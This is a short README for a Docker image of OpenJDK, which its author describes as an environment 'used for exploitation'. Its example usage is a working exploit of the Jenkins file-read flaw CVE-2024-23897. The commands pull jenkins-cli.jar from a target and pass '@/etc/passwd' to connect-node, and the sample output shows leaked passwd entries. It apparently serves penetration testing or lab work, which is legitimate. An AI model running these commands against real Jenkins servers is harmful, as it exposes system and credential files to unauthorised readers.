# Java (OpenJDK)

A Dockerized Java environment used for exploitation (with wget for pulling jar files)

## Build image

```
docker build -t java .
```

Build the java (openjdk) image locally


## Running the container

```
docker run -it java
```

Run the java container

## Example usage (Jenkins LFI - CVE-2024-23897)

```
wget http://<target>:8080/jnlpJars/jenkins-cli.jar
```
Pull Jenkins-cli from a target machine

```
java -jar jenkins-cli.jar -s  http://<target>:8080/ -http connect-node "@/etc/passwd"
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
---truncated---
```
